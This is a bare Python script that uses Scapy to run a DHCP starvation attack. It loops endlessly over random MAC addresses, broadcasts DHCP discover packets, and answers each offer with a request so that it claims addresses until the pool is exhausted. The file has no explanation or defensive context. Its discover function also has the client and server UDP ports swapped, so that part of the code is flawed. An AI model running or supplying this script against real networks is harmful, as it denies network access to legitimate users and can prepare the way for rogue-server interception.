from scapy.all import *
import os

def send_dhcp_discover(randMac):
       ether=Ether(dst="ff:ff:ff:ff:ff:ff",src=randMac)
       ip=IP(src ="0.0.0.0",dst="255.255.255.255")
       udp=UDP(sport=67,dport=68)
       bootp=BOOTP(chaddr=randMac,ciaddr ="0.0.0.0",flags=1)
       dhcp=DHCP(options=[
                ("message-type","discover"),
                ("hostname","kali"),
                "end"
            ])
       sendp(ether/ip/udp/bootp/dhcp,loop=0)

def handle_dhcp_offer(packet):
    if packet.haslayer(DHCP) and packet[DHCP].options[0][1] == 2:
        mac_addr = packet[BOOTP].chaddr
        offered_ip = packet[BOOTP].yiaddr
        server_ip = packet[IP].src
        print(f"Received DHCP OFFER: {offered_ip}")
        send_dhcp_request(offered_ip, server_ip, packet[BOOTP].xid, mac_addr)

def send_dhcp_request(offered_ip, server_ip, xid, mac_addr):
    dhcp_request = (
        Ether(dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=mac_addr, xid=xid) /
        DHCP(options=[
            ("message-type", "request"),
            ("requested_addr", offered_ip),
            ("server_id", server_ip),
            ("end")
        ])
    )
    sendp(dhcp_request, iface=conf.iface)
    print(f"Sent DHCP REQUEST for {offered_ip}")

def stop_filter(packet):
    return True

while True:
 randMac = RandMAC()
 send_dhcp_discover(randMac)
 sniff(filter="udp and (port 67 or port 68)", prn=handle_dhcp_offer, stop_filter=stop_filter, timeout=5, store=0)
